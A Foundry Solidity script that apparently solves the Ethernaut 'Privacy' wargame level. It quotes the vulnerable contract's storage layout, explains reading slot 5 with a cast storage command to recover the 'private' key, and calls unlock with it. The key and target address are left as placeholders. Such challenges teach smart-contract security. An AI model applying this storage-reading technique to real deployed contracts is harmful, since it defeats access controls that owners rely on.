// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {Script} from "forge-std/Script.sol";

//contract Privacy {
//    bool public locked = true;                              // slot 0 - 8 bytes, not packed
//    uint256 public ID = block.timestamp;                    // slot 1 - 32 bytes, full slot
//    uint8 private flattening = 10;                          // slot 2 - 8 bytes, packed at offset 0
//    uint8 private denomination = 255;                       // slot 2 - 8 bytes, packed at offset 64
//    uint16 private awkwardness = uint16(block.timestamp);   // slot 2 - 16 bytes, packed at offset 128
//    bytes32[3] private data;                       data[0]  // slot 3 - 32 bytes
//                                                   data[1]  // slot 4 - 32 bytes
//    constructor(bytes32[3] memory _data) {         data[2]  // slot 5 - 32 bytes
//        data = _data;
//    }
//
//    function unlock(bytes16 _key) public {
//        require(_key == bytes16(data[2]));
//        locked = false;
//    }
//}

interface IPrivacy
{
    function unlock(bytes16 _key) external;
}

// read the password with
// cast storage 0xinstance-address 5 --rpc-url $RPC_URL
// it will return a 32 byte value, use the upper (left most) 16 bytes as the password
contract Privacy is Script
{
    address target; // instance address

    function run() external
    {
        vm.startBroadcast();

        bytes16 key = bytes16(/* your password */);
        IPrivacy(target).unlock(key);

        vm.stopBroadcast();
    }
}
